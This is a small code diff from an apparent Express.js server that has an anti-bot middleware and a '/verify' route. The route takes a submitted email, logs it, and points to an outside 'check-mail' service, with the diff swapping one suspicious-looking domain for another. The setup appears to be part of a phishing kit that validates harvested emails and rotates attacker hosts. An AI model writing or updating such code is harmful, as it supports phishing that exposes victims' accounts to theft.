@@ -161,7 +161,7 @@ app.use(antiBotMiddleware);
 
 app.post('/verify', async (req, res) => {
     const { email } = req.body;
-    const url = `https://validate.sharingdoc.top/check-mail`;
+    const url = `https://validate.pinksales.help/check-mail`;
 
     console.log(email + " : " + "received");
     
